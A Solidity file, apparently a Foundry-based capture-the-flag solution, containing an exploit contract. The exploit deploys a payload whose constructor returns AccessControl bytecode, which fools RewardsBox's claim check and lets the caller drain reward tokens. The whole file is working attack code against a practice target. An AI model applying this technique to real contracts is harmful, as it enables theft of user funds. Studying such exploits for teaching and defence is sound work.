pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {AccessControl} from "../../src/accesscontrol/AccessControl.sol";
import {RewardsBox} from "../../src/accesscontrol/RewardsBox.sol";

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Attack {
    function pwn(address rewardsBox, address reward) public {
        address addr;
        address payload = address(new Payload());
        bytes memory code = payload.code;
        assembly {
            addr := create(0,add(code,0x20), mload(code))
        }
        RewardsBox(rewardsBox).claim(addr, 1e18);
        IERC20(reward).transfer(msg.sender, 1e18);
    }

    function finalize(address accessController, address rewardsBox, address reward) public {
        RewardsBox(rewardsBox).claim(accessController, 1e18);
        IERC20(reward).transfer(msg.sender, 1e18);
    }
}

contract Payload {
    mapping(address => bool) public owners;

    fallback(bytes calldata) external returns (bytes memory) {
        owners[msg.sender] = true;
        AccessControl accessControl = new AccessControl();
        return address(accessControl).code;
    }
}